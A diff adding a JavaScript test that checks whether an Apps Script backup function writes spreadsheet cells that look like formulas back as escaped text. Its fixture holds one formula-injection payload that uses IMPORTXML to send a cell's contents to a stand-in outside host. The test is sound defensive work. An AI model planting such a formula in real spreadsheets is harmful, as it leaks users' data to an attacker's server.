@@ -143,6 +143,16 @@ const home = (hid, name, extra) => ({ ['households/' + hid]: { name, members: ['
     ok(((A.docAt('households/h1/recipes/my_stew') || {}).title || '') === 'Nan\u2019s stew', 'restore: the old household\u2019s records are put into this one');
     ok(!A.errs.length, 'restore: no page errors ' + A.errs.join(' | '));
   }
+  // ---- 5. backup sheet: another household's rows that are kept are still written back as text, never as a formula ----
+  if (!only || only === 5) {
+    const vm = require('vm'), gs = {}; vm.createContext(gs); vm.runInContext(fs.readFileSync(__dirname + '/../../../apps-script/Code.gs', 'utf8'), gs);
+    let cells = [['household_id', 'person_id', 'name'], ['hFam', 'p1', '=IMPORTXML("https://x.example/?"&A1)'], ['hFam', 'p2', '-4.5']]; let written = null;
+    const sh = { getLastRow: () => cells.length, getLastColumn: () => 3, getMaxColumns: () => 3, getRange: (r, c, nr, nc) => ({ getValues: () => cells.slice(r - 1, r - 1 + nr).map(x => x.slice(c - 1, c - 1 + nc)),
+      setValues(v) { if (r === 2) written = v; return this; }, setFontWeight() { return this; }, setNumberFormat() { return this; } }), clearContents() {}, setFrozenRows() {}, deleteColumns() {} };
+    gs.writeTable_(sh, ['household_id', 'person_id', 'name'], [['h1', 'u1', 'Ethan']], 'h1');
+    const fam = (written || []).find(x => x[1] === 'p1') || [], num = (written || []).find(x => x[1] === 'p2') || [];
+    ok(fam[2] === '\'=IMPORTXML("https://x.example/?"&A1)' && num[2] === '-4.5', 'backup sheet: a kept row that looks like a formula is written back as text (' + fam[2] + ')');
+  }
   console.log(fails ? fails + ' FAILED' : 'all passed');
   process.exit(fails ? 1 : 0);
 })();
